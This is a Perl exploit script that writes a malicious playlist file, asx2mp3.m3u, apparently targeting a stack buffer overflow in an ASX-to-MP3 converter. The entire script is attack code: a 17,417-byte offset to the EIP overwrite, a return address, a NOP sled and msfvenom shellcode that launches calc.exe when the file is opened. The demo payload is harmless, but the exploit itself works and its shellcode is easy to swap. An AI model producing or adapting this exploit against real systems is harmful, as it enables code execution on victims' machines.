#!/usr/bin/perl

my $buffsize = 50000; 
my $junk = "http://"."A" x 17417; # Offset to EIP Overwrite
my $eip = pack('V', 0x01C27228); # Overwrite EP with Call EBX
my $nops = "\x90" x 1085; # fill remainder of the buffer with interrupts


# msfvenom -p windows/exec CMD=calc.exe -f perl -b '\x00\xff\x0a\x0d'
# size 227

my $shellcode = 
"\xba\xa9\x27\x35\x7d\xdb\xd3\xd9\x74\x24\xf4\x5e\x31\xc9" .
"\xb1\x31\x31\x56\x13\x83\xee\xfc\x03\x56\xa6\xc5\xc0\x81" .
"\x50\x8b\x2b\x7a\xa0\xec\xa2\x9f\x91\x2c\xd0\xd4\x81\x9c" .
"\x92\xb9\x2d\x56\xf6\x29\xa6\x1a\xdf\x5e\x0f\x90\x39\x50" .
"\x90\x89\x7a\xf3\x12\xd0\xae\xd3\x2b\x1b\xa3\x12\x6c\x46" .
"\x4e\x46\x25\x0c\xfd\x77\x42\x58\x3e\xf3\x18\x4c\x46\xe0" .
"\xe8\x6f\x67\xb7\x63\x36\xa7\x39\xa0\x42\xee\x21\xa5\x6f" .
"\xb8\xda\x1d\x1b\x3b\x0b\x6c\xe4\x90\x72\x41\x17\xe8\xb3" .
"\x65\xc8\x9f\xcd\x96\x75\x98\x09\xe5\xa1\x2d\x8a\x4d\x21" .
"\x95\x76\x6c\xe6\x40\xfc\x62\x43\x06\x5a\x66\x52\xcb\xd0" .
"\x92\xdf\xea\x36\x13\x9b\xc8\x92\x78\x7f\x70\x82\x24\x2e" .
"\x8d\xd4\x87\x8f\x2b\x9e\x25\xdb\x41\xfd\x23\x1a\xd7\x7b" .
"\x01\x1c\xe7\x83\x35\x75\xd6\x08\xda\x02\xe7\xda\x9f\xfd" .
"\xad\x47\x89\x95\x6b\x12\x88\xfb\x8b\xc8\xce\x05\x08\xf9" .
"\xae\xf1\x10\x88\xab\xbe\x96\x60\xc1\xaf\x72\x87\x76\xcf" .
"\x56\xe4\x19\x43\x3a\xc5\xbc\xe3\xd9\x19";

my $sploit = $junk.$eip.$nops.$shellcode; # Sploit portion of Buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of the buffer
my $buffer = $sploit.$fill; # Build Final Buffer

# Write Exploit Buffer to File
my $file = "asx2mp3.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer Size: " . length($buffer) . "\n";

